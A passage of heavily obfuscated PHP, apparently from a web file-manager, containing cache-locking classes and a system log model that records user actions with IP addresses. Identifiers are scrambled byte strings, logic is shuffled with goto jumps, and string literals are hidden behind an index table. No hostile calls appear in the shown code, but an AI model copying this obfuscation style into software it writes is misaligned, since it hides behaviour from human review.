filemtime($BôïÆ÷ÏŞ) < time()) { @unlink($BôïÆ÷ÏŞ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÅ‚ÖÆÙÌ–; BÉ±­øà‰Ö: self::$timeout = $f­ŠÌ“»ğ–[$f˜¢ÙÛ±[821]] ? $f­ŠÌ“»ğ–[$f˜¢ÙÛ±[821]] : 10; $FÂ”ŸÄ“’ë = _get($GLOBALS[$f˜¢ÙÛ±[6]], $f˜¢ÙÛ±[822]); $BÄĞ‰¦õŒ = $f­ŠÌ“»ğ–[$f˜¢ÙÛ±[808]] ? $f­ŠÌ“»ğ–[$f˜¢ÙÛ±[808]] : $f˜¢ÙÛ±[193]; goto E§‰ÖÒò¯„; E§‰ÖÒò¯„: if ($BÄĞ‰¦õŒ == $f˜¢ÙÛ±[17] && $FÂ”ŸÄ“’ë == $f˜¢ÙÛ±[9]) { $BÄĞ‰¦õŒ = $f˜¢ÙÛ±[193]; } switch ($BÄĞ‰¦õŒ) { case $f˜¢ÙÛ±[811]: self::$handle = new CacheLockRedis(); break; case $f˜¢ÙÛ±[812]: self::$handle = new CacheLockMemcached(); break; case $f˜¢ÙÛ±[17]: self::$handle = new CacheLockDatabase(); break; case $f˜¢ÙÛ±[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C÷³ìÀŠ£à; DÅ‚ÖÆÙÌ–: $f˜¢ÙÛ± =& $_SERVER[úÉ·öƒÑì©]; if (self::$handle) { return self::$handle; } $f­ŠÌ“»ğ– = $GLOBALS[$f˜¢ÙÛ±[6]][$f˜¢ÙÛ±[356]]; goto BÉ±­øà‰Ö; C÷³ìÀŠ£à: } private static function key($eò÷¨¾Ş) { return $_SERVER[úÉ·öƒÑì©][823] . Cache::key($eò÷¨¾Ş); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($eÜ„½–èšÒ = '') { self::$errorMsg = $eÜ„½–èšÒ; } public static function lockGlobal($a„íÍ¿÷Š, $açŒ¡Ï»ùÉ) { return self::lock($a„íÍ¿÷Š, $açŒ¡Ï»ùÉ, !0); } public static function lock($D‘÷õô‚¨, $BŸ¡…íË¹ç = false, $e¨Ùó’Ö‘ = false) { goto B•ìºÃÄ“Ã; B•ìºÃÄ“Ã: $b÷Å–ï =& $_SERVER[úÉ·öƒÑì©]; $a£âãèÄÄ® = self::init(); $DôïÍíÊè = self::key($D‘÷õô‚¨); goto C‘ãªáôÖ¨; D‚Ìë×Ê¾«: if (!$e¨Ùó’Ö‘) { self::$lockItem[$DôïÍíÊè] = !0; } return $Fˆ»®…˜Õ‡; goto D„µ“×Ü•Š; C‘ãªáôÖ¨: $BŸ¡…íË¹ç = $BŸ¡…íË¹ç ? $BŸ¡…íË¹ç : self::$timeout; $Fˆ»®…˜Õ‡ = $a£âãèÄÄ®->lock($DôïÍíÊè, $BŸ¡…íË¹ç); if (!$Fˆ»®…˜Õ‡) { $d©«¶ª¨à = "\x6c\157\143\153\40\145\162\162\157\x72\x3b\x6b\x65\x79\75{$D‘÷õô‚¨}\73\164\151\155\x65\75{$BŸ¡…íË¹ç}\x3b" . self::$errorMsg . $b÷Å–ï[68] . get_caller_msg(); $eí¥ğù½±¿ = LNG($b÷Å–ï[824]) . "\50{$BŸ¡…íË¹ç}\163\x29\x2e" . LNG($b÷Å–ï[825]); $eí¥ğù½±¿ .= $b÷Å–ï[826]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eí¥ğù½±¿ = $eí¥ğù½±¿ . $b÷Å–ï[827] . self::$errorMsg; } write_log($d©«¶ª¨à, $b÷Å–ï[828]); show_json($eí¥ğù½±¿, !1); } goto D‚Ìë×Ê¾«; D„µ“×Ü•Š: } public static function lockGet($d§ù…òë‰ğ) { $Fî«†Œğ£» = self::key($d§ù…òë‰ğ); if (self::$lockItem[$Fî«†Œğ£»]) { return self::$lockItem[$Fî«†Œğ£»]; } return self::init()->lockGet($Fî«†Œğ£»); } public static function unlock($e®¡˜è©‰ƒ) { $fìö”–‡ÏÀ = self::key($e®¡˜è©‰ƒ); self::$lockItem[$fìö”–‡ÏÀ] = null; return self::init()->unlock($fìö”–‡ÏÀ); } public static function unlockRuntime() { $fèæÌ©ˆ´è =& $_SERVER[úÉ·öƒÑì©]; $FáÉ™‘çô— = self::init(); $D„˜«„åº = !1; foreach (self::$lockItem as $Aõ»ì‹îò => $e£íˆ­Å—) { if (!$e£íˆ­Å—) { continue; } $FáÉ™‘çô—->unlock($Aõ»ì‹îò); if (!$D„˜«„åº) { $D„˜«„åº = !0; write_log($fèæÌ©ˆ´è[829] . $Aõ»ì‹îò . $fèæÌ©ˆ´è[68] . get_caller_msg(), $fèæÌ©ˆ´è[828]); continue; } write_log($fèæÌ©ˆ´è[829] . $Aõ»ì‹îò, $fèæÌ©ˆ´è[828]); } self::fileUnlockAll(); } public static function fileLock($Cİ…Ë¤šŠ) { goto b¶æèÊİÁË; e‹Ğñïºù: $dæí¯ãµå† = fopen(DATA_PATH . $Cİ…Ë¤šŠ . $aÚÁ°š²Óº[831], $aÚÁ°š²Óº[832]); if (!$dæí¯ãµå†) { return !1; } $GLOBALS[$aÚÁ°š²Óº[830]][$Cİ…Ë¤šŠ] = $dæí¯ãµå†; goto bİ¹Ø˜ª¢; b¶æèÊİÁË: $aÚÁ°š²Óº =& $_SERVER[úÉ·öƒÑì©]; if (!$GLOBALS[$aÚÁ°š²Óº[830]]) { $GLOBALS[$aÚÁ°š²Óº[830]] = array(); } $GLOBALS[$aÚÁ°š²Óº[830]][$Cİ…Ë¤šŠ] = !1; goto e‹Ğñïºù; EçƒŠ–äß†: return !1; goto E¸¸‰¡Ä£ö; bİ¹Ø˜ª¢: if (flock($dæí¯ãµå†, LOCK_EX)) { return !0; } self::unlock($Cİ…Ë¤šŠ); show_json($aÚÁ°š²Óº[833], !1); goto EçƒŠ–äß†; E¸¸‰¡Ä£ö: } public static function fileUnlock($Dóè³ñ½§Ù) { $Cê‡ÉùïÂ =& $_SERVER[úÉ·öƒÑì©]; $FËææº¥œÂ = $GLOBALS[$Cê‡ÉùïÂ[830]][$Dóè³ñ½§Ù]; if (!$FËææº¥œÂ) { return; } $GLOBALS[$Cê‡ÉùïÂ[830]][$Dóè³ñ½§Ù] = !1; flock($FËææº¥œÂ, LOCK_UN); fclose($FËææº¥œÂ); } public static function fileUnlockAll() { $BŸÙÄèªÌ =& $_SERVER[úÉ·öƒÑì©]; if (!$GLOBALS[$BŸÙÄèªÌ[830]]) { return; } foreach ($GLOBALS[$BŸÙÄèªÌ[830]] as $Eµ“—Ä°¶˜ => $aÅ‹Ù¦•—) { if (!$aÅ‹Ù¦•—) { continue; } $GLOBALS[$BŸÙÄèªÌ[830]][$Eµ“—Ä°¶˜] = !1; flock($aÅ‹Ù¦•—, LOCK_UN); fclose($aÅ‹Ù¦•—); } $GLOBALS[$BŸÙÄèªÌ[830]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto BğÏ©­»–‹; c³½ëÔ¹¨é: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x4c\x69\147\150\x74\x41\160\x70"; public $modelType = "\x53\171\x73\164\x65\155\117\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\x67\162\157\x75\x70", "\144\145\x73\x63", "\143\x6f\156\164\x65\x6e\x74"); public function listData($dÒ„ğìŸ¨¿ = false, $cˆÄâÉ® = "\155\x6f\x64\151\146\171\124\151\155\x65", $b‚å¬ÇÆôÒ = true) { return parent::listData($dÒ„ğìŸ¨¿, $cˆÄâÉ®, $b‚å¬ÇÆôÒ); } public function remove($f¶ÚÃĞ¾Œ) { $D’ƒìğ£šŒ = $this->findByName($f¶ÚÃĞ¾Œ); if (!$D’ƒìğ£šŒ) { return !1; } return parent::remove($D’ƒìğ£šŒ[$_SERVER[úÉ·öƒÑì©][402]]); } public function add($AÑ¡‘¯¿‚) { if ($this->findByName($AÑ¡‘¯¿‚[$_SERVER[úÉ·öƒÑì©][28]])) { return !1; } return parent::insert($AÑ¡‘¯¿‚); } public function update($dˆ÷±Á„ˆè, $AŸøÁ§Ù¯ğ) { $C†½ìÆËÍÌ =& $_SERVER[úÉ·öƒÑì©]; $AÁßå³ñÍƒ = $this->findByName($dˆ÷±Á„ˆè); $F§Êª…äÌ³ = $this->findByName($AŸøÁ§Ù¯ğ[$C†½ìÆËÍÌ[28]]); if (!$AÁßå³ñÍƒ || $F§Êª…äÌ³ && $F§Êª…äÌ³[$C†½ìÆËÍÌ[402]] != $AÁßå³ñÍƒ[$C†½ìÆËÍÌ[402]]) { return !1; } return parent::update($AÁßå³ñÍƒ[$C†½ìÆËÍÌ[402]], $AŸøÁ§Ù¯ğ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\x6d\x65", "\164\151\155\145", "\151\156\x73\145\x72\x74", "\146\x75\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $FÄÒŒ½‰  =& $_SERVER[úÉ·öƒÑì©]; return array($FÄÒŒ½‰ [2011] => LNG($FÄÒŒ½‰ [2012]), $FÄÒŒ½‰ [2013] => LNG($FÄÒŒ½‰ [2014]), $FÄÒŒ½‰ [1639] => LNG($FÄÒŒ½‰ [2015]), $FÄÒŒ½‰ [2016] => LNG($FÄÒŒ½‰ [2017]), $FÄÒŒ½‰ [2018] => LNG($FÄÒŒ½‰ [2019]), $FÄÒŒ½‰ [2020] => LNG($FÄÒŒ½‰ [2021]), $FÄÒŒ½‰ [2022] => LNG($FÄÒŒ½‰ [2023]), $FÄÒŒ½‰ [1669] => LNG($FÄÒŒ½‰ [2023]), $FÄÒŒ½‰ [1670] => LNG($FÄÒŒ½‰ [2024]), $FÄÒŒ½‰ [2025] => LNG($FÄÒŒ½‰ [2026]), $FÄÒŒ½‰ [2027] => LNG($FÄÒŒ½‰ [2028]), $FÄÒŒ½‰ [2029] => LNG($FÄÒŒ½‰ [2030]), $FÄÒŒ½‰ [2031] => LNG($FÄÒŒ½‰ [2032]), $FÄÒŒ½‰ [1667] => LNG($FÄÒŒ½‰ [2033]), $FÄÒŒ½‰ [2034] => LNG($FÄÒŒ½‰ [2035]), $FÄÒŒ½‰ [1674] => LNG($FÄÒŒ½‰ [2036]), $FÄÒŒ½‰ [2037] => LNG($FÄÒŒ½‰ [2038]), $FÄÒŒ½‰ [2039] => LNG($FÄÒŒ½‰ [2040]), $FÄÒŒ½‰ [2041] => LNG($FÄÒŒ½‰ [2042]), $FÄÒŒ½‰ [2043] => LNG($FÄÒŒ½‰ [2044]), $FÄÒŒ½‰ [1677] => LNG($FÄÒŒ½‰ [2045]), $FÄÒŒ½‰ [1678] => LNG($FÄÒŒ½‰ [2046]), $FÄÒŒ½‰ [2047] => LNG($FÄÒŒ½‰ [2048]), $FÄÒŒ½‰ [2049] => LNG($FÄÒŒ½‰ [2050]), $FÄÒŒ½‰ [2051] => LNG($FÄÒŒ½‰ [2052]), $FÄÒŒ½‰ [1672] => LNG($FÄÒŒ½‰ [2053]), $FÄÒŒ½‰ [2054] => LNG($FÄÒŒ½‰ [2055]), $FÄÒŒ½‰ [1671] => LNG($FÄÒŒ½‰ [2056]), $FÄÒŒ½‰ [2057] => LNG($FÄÒŒ½‰ [2058]), $FÄÒŒ½‰ [2059] => LNG($FÄÒŒ½‰ [2060]), $FÄÒŒ½‰ [2061] => LNG($FÄÒŒ½‰ [2062]), $FÄÒŒ½‰ [2063] => LNG($FÄÒŒ½‰ [2063]), $FÄÒŒ½‰ [2064] => LNG($FÄÒŒ½‰ [1643]), $FÄÒŒ½‰ [2065] => LNG($FÄÒŒ½‰ [2066]), $FÄÒŒ½‰ [2067] => LNG($FÄÒŒ½‰ [2068]), $FÄÒŒ½‰ [2069] => LNG($FÄÒŒ½‰ [2070]), $FÄÒŒ½‰ [2071] => LNG($FÄÒŒ½‰ [2072]), $FÄÒŒ½‰ [2073] => LNG($FÄÒŒ½‰ [2074]), $FÄÒŒ½‰ [2075] => LNG($FÄÒŒ½‰ [2075]), $FÄÒŒ½‰ [2076] => LNG($FÄÒŒ½‰ [2077]), $FÄÒŒ½‰ [2078] => LNG($FÄÒŒ½‰ [2079]), $FÄÒŒ½‰ [2080] => LNG($FÄÒŒ½‰ [2081]), $FÄÒŒ½‰ [2082] => LNG($FÄÒŒ½‰ [2083]), $FÄÒŒ½‰ [2084] => LNG($FÄÒŒ½‰ [2085]), $FÄÒŒ½‰ [2086] => LNG($FÄÒŒ½‰ [2087])); } private function typeFile() { $e ´ÓÎ‚èÊ =& $_SERVER[úÉ·öƒÑì©]; $DØš„ÇÈ = array($e ´ÓÎ‚èÊ[1674] => array($e ´ÓÎ‚èÊ[1675]), $e ´ÓÎ‚èÊ[2029] => array($e ´ÓÎ‚èÊ[2088]), $e ´ÓÎ‚èÊ[2031] => array($e ´ÓÎ‚èÊ[2089]), $e ´ÓÎ‚èÊ[1667] => array($e ´ÓÎ‚èÊ[1668]), $e ´ÓÎ‚èÊ[2039] => array(), $e ´ÓÎ‚èÊ[2041] => array(), $e ´ÓÎ‚èÊ[2043] => array(), $e ´ÓÎ‚èÊ[1677] => array($e ´ÓÎ‚èÊ[1679]), $e ´ÓÎ‚èÊ[1678] => array($e ´ÓÎ‚èÊ[1679]), $e ´ÓÎ‚èÊ[2047] => array($e ´ÓÎ‚èÊ[2090]), $e ´ÓÎ‚èÊ[2049] => array($e ´ÓÎ‚èÊ[2090]), $e ´ÓÎ‚èÊ[2051] => array($e ´ÓÎ‚èÊ[2091]), $e ´ÓÎ‚èÊ[2037] => array($e ´ÓÎ‚èÊ[2092]), $e ´ÓÎ‚èÊ[1672] => array($e ´ÓÎ‚èÊ[2093]), $e ´ÓÎ‚èÊ[2054] => array($e ´ÓÎ‚èÊ[2094]), $e ´ÓÎ‚èÊ[1671] => array($e ´ÓÎ‚èÊ[1673])); return $DØš„ÇÈ; } private function typeAll() { goto FŠ‘ëÙ˜ñ›; d°ÖÂ»Çº: foreach ($eºÀ ïƒ• as $eŒõâùù„ª => $A‰¹ˆé¹”Ë) { $B½İ±¬§¢ [$A‰¹ˆé¹”Ë[0]] = $B½İ±¬§¢ [$eŒõâùù„ª]; } $B½İ±¬§¢ [$fí¦²âÌª¡[1679]] = LNG($fí¦²âÌª¡[2095]); $B½İ±¬§¢ [$fí¦²âÌª¡[2090]] = LNG($fí¦²âÌª¡[2096]); goto A½ŠìÃµƒ; FŠ‘ëÙ˜ñ›: $fí¦²âÌª¡ =& $_SERVER[úÉ·öƒÑì©]; $B½İ±¬§¢  = $this->typeList; $eºÀ ïƒ• = array_filter($this->typeFile()); goto d°ÖÂ»Çº; A½ŠìÃµƒ: return $B½İ±¬§¢ ; goto Døº¬°Ç‘; Døº¬°Ç‘: } public function addLog($d»‹¡ÎÎÂ£, $FÀÁÀ×”õ· = array()) { goto fÃÑÌ™Ñöß; E½Ë–æÄª¿: if (!$Dš‚¬šÌğğ) { $Dš‚¬šÌğğ = (int) Session::get($eğ–³º·Øñ[1825]); } $e«¤á¬Ûğ = get_client_ip(); if (!$FÀÁÀ×”õ· || strlen(json_encode($FÀÁÀ×”õ·)) >= 1024) { $FÀÁÀ×”õ· = array($eğ–³º·Øñ[2097] => $e«¤á¬Ûğ); } else { if (is_array($FÀÁÀ×”õ·)) { $FÀÁÀ×”õ·[$eğ–³º·Øñ[2097]] = $e«¤á¬Ûğ; } else { $FÀÁÀ×”õ· = array($eğ–³º·Øñ[1096] => $FÀÁÀ×”õ·, $eğ–³º·Øñ[2097] => $e«¤á¬Ûğ); } } goto CÛÒËÉÄ‡¶; CÛÒËÉÄ‡¶: $FÀÁÀ×”õ· = array($eğ–³º·Øñ[1526] => Session::sign(), $eğ–³º·Øñ[1527] => $Dš‚¬šÌğğ, $eğ–³º·Øñ[29] => $d»‹¡ÎÎÂ£, $eğ–³º·Øñ[1529] => json_encode($FÀÁÀ×”õ·)); parent::add($FÀÁÀ×”õ·); goto F‰æÂ¼ö­Ö; fÃÑÌ™Ñöß: $eğ–³º·Øñ =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->typeList[$d»‹¡ÎÎÂ£])) { return; } $Dš‚¬šÌğğ = defined($eğ–³º·Øñ[463]) && USER_ID ? USER_ID : (isset($FÀÁÀ×”õ·[$eğ–³º·Øñ[1535]]) ? $FÀÁÀ×”õ·[$eğ–³º·Øñ[1535]] : 0); goto E½Ë–æÄª¿; F‰æÂ¼ö­Ö: } public function remove($BäğÈÚÅ†) { $this->where(array($_SERVER[úÉ·öƒÑì©][421] => $BäğÈÚÅ†))->delete(); } private function _makeOrder($CÀ›‘×œâ = '') { goto b…ô½¼ó•Ì; b…ô½¼ó•Ì: $BßÕ·¹’ãø =& $_SERVER[úÉ·öƒÑì©]; $a¾ÖŠ‚„‡Ğ = $BßÕ·¹’ãø[194]; $Dê¸¼â½°› = array($BßÕ·¹’ãø[437] => $BßÕ·¹’ãø[438], $BßÕ·¹’ãø[439] => $BßÕ·¹’ãø[440]); goto fİ§ˆê‘»ä; fİ§ˆê‘»ä: $fÒÑ¦Ó±–“ = Input::get($BßÕ·¹’ãø[445], $BßÕ·¹’ãø[7], $BßÕ·¹’ãø[1857], array($BßÕ·¹’ãø[1781], $BßÕ·¹’ãø[439])); $fÒÑ¦Ó±–“ = $Dê¸¼â½°›[$fÒÑ¦Ó±–“]; $CÀ›‘×œâ = $CÀ›‘×œâ . "{$a¾ÖŠ‚„‡Ğ}\40{$fÒÑ¦Ó±–“}"; goto fÌ…¤Õ¥Ü; fÌ…¤Õ¥Ü: return $this->order($CÀ›‘×œâ); goto B„·à‡öø; B„·à‡öø: } public function get($cƒÉŒ‘Êñ‘ = '') { goto d„éŒÖ½¥ ; d„éŒÖ½¥ : $cöšèÔ‚» =& $_SERVER[úÉ·öƒÑì©]; if (!$cƒÉŒ‘Êñ‘) { show_json(array()); } $FÙÜ›ŞğöÍ = array(); goto A¦’ò¼ˆÜ; B—ÙáŒ’Öœ: $c¿µÑ¦İİ[$cöšèÔ‚»[376]] = $this->logList($c¿µÑ¦İİ[$cöšèÔ‚»[376]]); return $c¿µÑ¦İİ; goto c‘Œ»Ù¹Ô; A¦’ò¼ˆÜ: if ($cƒÉŒ‘Êñ‘[$cöšèÔ‚»[1535]]) { $FÙÜ›ŞğöÍ[$cöšèÔ‚»[1535]] = $cƒÉŒ‘Êñ‘[$cöšèÔ‚»[1535]]; } if (isset($cƒÉŒ‘Êñ‘[$cöšèÔ‚»[737]])) { $d¸¶‹‘ŒŒ¤ = $cƒÉŒ‘Êñ‘[$cöšèÔ‚»[737]]; $bÚãÔ·Ş”ó = isset($cƒÉŒ‘Êñ‘[$cöšèÔ‚»[485]]) ? $cƒÉŒ‘Êñ‘[$cöšèÔ‚»[485]] : time(); $FÙÜ›ŞğöÍ[$cöšèÔ‚»[194]] = array($cöšèÔ‚»[340], array($d¸¶‹‘ŒŒ¤, $bÚãÔ·Ş”ó)); } if ($cƒÉŒ‘Êñ‘[$cöšèÔ‚»[29]]) { $B×¦·¢‡ê = explode($cöšèÔ‚»[47], $cƒÉŒ‘Êñ‘[$cöšèÔ‚»[29]]); $f¾˜º¤ìÎ¨ = $this->typeFile(); $cÄÍã¢•‰ˆ = array(); foreach ($B×¦·¢‡ê as $fç®ÉÔ‡¤) { $cÄÍã¢•‰ˆ[] = $fç®ÉÔ‡¤; if (isset($f¾˜º¤ìÎ¨[$fç®ÉÔ‡¤])) { $cÄÍã¢•‰ˆ = array_merge($cÄÍã¢•‰ˆ, $f¾˜º¤ìÎ¨[$fç®ÉÔ‡¤]); } } $cÄÍã¢•‰ˆ = array_unique($cÄÍã¢•‰ˆ); if ($cÄÍã¢•‰ˆ) { $FÙÜ›ŞğöÍ[$cöšèÔ‚»[29]] = array($cöšèÔ‚»[7], $cÄÍã¢•‰ˆ); } } else { $FÙÜ›ŞğöÍ[$cöšèÔ‚»[29]] = array($cöšèÔ‚»[2098], $cöšèÔ‚»[2099]); } goto F’˜†¯£˜; F’˜†¯£˜: if (!empty($cƒÉŒ‘Êñ‘[$cöšèÔ‚»[2097]])) { $FÙÜ›ŞğöÍ[$cöšèÔ‚»[440]] = array($cöšèÔ‚»[389], "\45{$cƒÉŒ‘Êñ‘[$cöšèÔ‚»[2097]]}\x25"); } $c¿µÑ¦İİ = $this->_makeOrder()->where($FÙÜ›ŞğöÍ)->selectPage(); if (empty($c¿µÑ¦İİ[$cöšèÔ‚»[376]])) { show_json(array(), !0, $c¿µÑ¦İİ[$cöšèÔ‚»[373]]); } goto B—ÙáŒ’Öœ; c‘Œ»Ù¹Ô: } private function ipAddress(&$fÒñööã¿ ) { $AÈ‡˜ªÛšà =& $_SERVER[úÉ·öƒÑì©]; if (!empty($fÒñööã¿ [$AÈ‡˜ªÛšà[2097]])) { $FôëÀó°ïæ = IpLocation::get($fÒñööã¿ [$AÈ‡˜ªÛšà[2097]]); } else { $FôëÀó°ïæ = LNG($AÈ‡˜ªÛšà[2100]); } $fÒñööã¿ [$AÈ‡˜ªÛšà[2101]] = $FôëÀó°ïæ; } private function descZipDownload($aõ¿İùòÍÜ, &$FˆÔÔ¹à©Ñ) { $dÌ•»Ìé¸ =& $_SERVER[úÉ·öƒÑì©]; if (!isset($aõ¿İùòÍÜ[$dÌ•»Ìé¸[2102]])) { return; } $cõ¼¨Ê…ª— = json_decode($aõ¿İùòÍÜ[$dÌ•»Ìé¸[2102]], !0); foreach ($cõ¼¨Ê…ª— as $bĞÚ„òªëš) { try { $dù‘³¥Áë = IO::infoFull($bĞÚ„òªëš[$dÌ•»Ìé¸[76]]); } catch (Exception $C´„¥´ ßí) { continue; } $aõ¿İùòÍÜ[$dÌ•»Ìé¸[76]] = $bĞÚ„òªëš[$dÌ•»Ìé¸[76]]; $FˆÔÔ¹à©Ñ[] = $aõ¿İùòÍÜ[$dÌ•»Ìé¸[404]] = $dù‘³¥Áë[$dÌ•»Ìé¸[404]]; $FˆÔÔ¹à©Ñ[] = $aõ¿İùòÍÜ[$dÌ•»Ìé¸[1913]] = $dù‘³¥Áë[$dÌ•»Ìé¸[487]]; break; } return $aõ¿İùòÍÜ; } private function getSourceList(&$cŞÉºº´‹î) { $EóÌŠ±ÇĞµ =& $_SERVER[úÉ·öƒÑì©]; $B°ê‘™áà = array(); foreach ($cŞÉºº´‹î as $C˜ÓƒÒˆğ“ => $E´‚ÜÉñé) { goto EĞµºˆ½¬; E‡²ÒÜŞ¨„: $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[404]]; $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[1913]]; if ($F–â„Ì‡[$EóÌŠ±ÇĞµ[29]] == $EóÌŠ±ÇĞµ[529]) { $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[440]][$EóÌŠ±ÇĞµ[1063]]; $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[440]][$EóÌŠ±ÇĞµ[1064]]; } goto DòÃÖåšµ®; DòÃÖåšµ®: if ($F–â„Ì‡[$EóÌŠ±ÇĞµ[29]] == $EóÌŠ±ÇĞµ[1921]) { $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[440]][$EóÌŠ±ÇĞµ[404]]; } goto B‹˜–‰àµ; EĞµºˆ½¬: $F–â„Ì‡ = json_decode($E´‚ÜÉñé[$EóÌŠ±ÇĞµ[440]], !0); if ($E´‚ÜÉñé[$EóÌŠ±ÇĞµ[29]] == $EóÌŠ±ÇĞµ[1670]) { $F–â„Ì‡ = $this->descZipDownload($F–â„Ì‡, $B°ê‘™áà); $cŞÉºº´‹î[$C˜ÓƒÒˆğ“][$EóÌŠ±ÇĞµ[440]] = json_encode($F–â„Ì‡); continue; } if (strpos($E´‚ÜÉñé[$EóÌŠ±ÇĞµ[29]], $EóÌŠ±ÇĞµ[1914]) !== 0) { if (!isset($F–â„Ì‡[$EóÌŠ±ÇĞµ[76]]) || strpos($E´‚ÜÉñé[$EóÌŠ±ÇĞµ[29]], $EóÌŠ±ÇĞµ[2103]) !== 0) { continue; } try { $BÁ£òÁÁª‡ = IO::infoFull($F–â„Ì‡[$EóÌŠ±ÇĞµ[76]]); } catch (Exception $aÕÁÉÀÑ‰…) { continue; } $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[404]] = $BÁ£òÁÁª‡[$EóÌŠ±ÇĞµ[404]]; $B°ê‘™áà[] = $F–â„Ì‡[$EóÌŠ±ÇĞµ[1913]] = $BÁ£òÁÁª‡[$EóÌŠ±ÇĞµ[487]]; $cŞÉºº´‹î[$C˜ÓƒÒˆğ“][$EóÌŠ±ÇĞµ[440]] = json_encode($F–â„Ì‡); continue; } goto E‡²ÒÜŞ¨„; B‹˜–‰àµ: } if (!$B°ê‘™áà) { return array(); } return Model($EóÌŠ±ÇĞµ[806])->sourceListInfo($B°ê‘™áà, !0); } private function logList($b™êåÂØ‹Ş) { goto aÚ³¿»©…‹; aÚ³¿»©…‹: $e›á—•ãá÷ =& $_SERVER[úÉ·öƒÑì©]; $e‹À±°øÎò = array_to_keyvalue($b™êåÂØ‹Ş, $e›á—•ãá÷[33], $e›á—•ãá÷[1535]); $dÜµ†¨òØó = Model($e›á—•ãá÷[515])->userListInfo(array_unique($e‹À±°øÎò)); goto EÀùô»‡¬‡; F£¥¦¤ÓŠÉ: $e—à´åè®â = array(); foreach ($b™êåÂØ‹Ş as $EÇÑš‘Ôà => $A‹ŸÈÇÏŞ) { goto d¼ŒòÇÙ¡á; FëÃ“¼¾ğ: $this->ipAddress($A‹ŸÈÇÏŞ); if (strpos($dÃĞè´¦Ä¥, $e›á—•ãá÷[1914]) === 0 || isset($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1913]])) { goto F–¦„Á‰Ã; b¹Ú¨ñªó: if ($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1926]] && $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1926]][$e›á—•ãá÷[413]] == $e›á—•ãá÷[1178]) { $e—à´åè®â[] = $A‹ŸÈÇÏŞ[$e›á—•ãá÷[402]]; unset($b™êåÂØ‹Ş[$EÇÑš‘Ôà]); continue; } goto C‡ÔÑë‡Çê; B›»Ë¬¥ÕÏ: if ($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[29]] == $e›á—•ãá÷[1921]) { $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[404]] = $B¢æ³Ê‘…´[$CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[404]]]; } if ($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[29]] == $e›á—•ãá÷[1665]) { $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1926]] = $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[85]]; $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1913]] = $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1926]][$e›á—•ãá÷[404]]; $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[85]] = !1; $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[404]] = $e›á—•ãá÷[33]; } if ($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[85]] && $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[85]][$e›á—•ãá÷[413]] == $e›á—•ãá÷[1178]) { $e—à´åè®â[] = $A‹ŸÈÇÏŞ[$e›á—•ãá÷[402]]; unset($b™êåÂØ‹Ş[$EÇÑš‘Ôà]); continue; } goto b¹Ú¨ñªó; F–¦„Á‰Ã: $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[85]] = $B¢æ³Ê‘…´[$CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[404]]]; $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1926]] = $B¢æ³Ê‘…´[$CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[1913]]]; if ($CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[29]] == $e›á—•ãá÷[529]) { $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[1063]] = $B¢æ³Ê‘…´[$CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[1063]]]; $CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[1064]] = $B¢æ³Ê‘…´[$CÎ¥Ú”ÔÌ…[$e›á—•ãá÷[440]][$e›á—•ãá÷[1064]]]; } goto B›»Ë¬¥ÕÏ; C‡ÔÑë‡Çê: } $A‹ŸÈÇÏŞ[$e›á—•ãá÷[440]] = $CÎ¥Ú”ÔÌ…; goto F·¨Õ´£õ; F·¨Õ´£õ: unset($A‹ŸÈÇÏŞ[$e›á—•ãá÷[2106]]); $fİ²¼´›ºÁ[] = $A‹ŸÈÇÏŞ; goto b»’‰áÀ»“; D‘©ÑÍÙì…: $A‹ŸÈÇÏŞ[$e›á—•ãá÷[28]] = isset($eêãç¡Ø[$e›á—•ãá÷[28]]) ? $eêãç¡Ø[$e›á—•ãá÷[28]] : LNG($e›á—•ãá÷[2100]); $A‹ŸÈÇÏŞ[$e›á—•ãá÷[1963]] = isset($eêãç¡Ø[$e›á—•ãá÷[1963]]) ? $eêãç¡Ø[$e›á—•ãá÷[1963]] : $e›á—•ãá÷[33]; 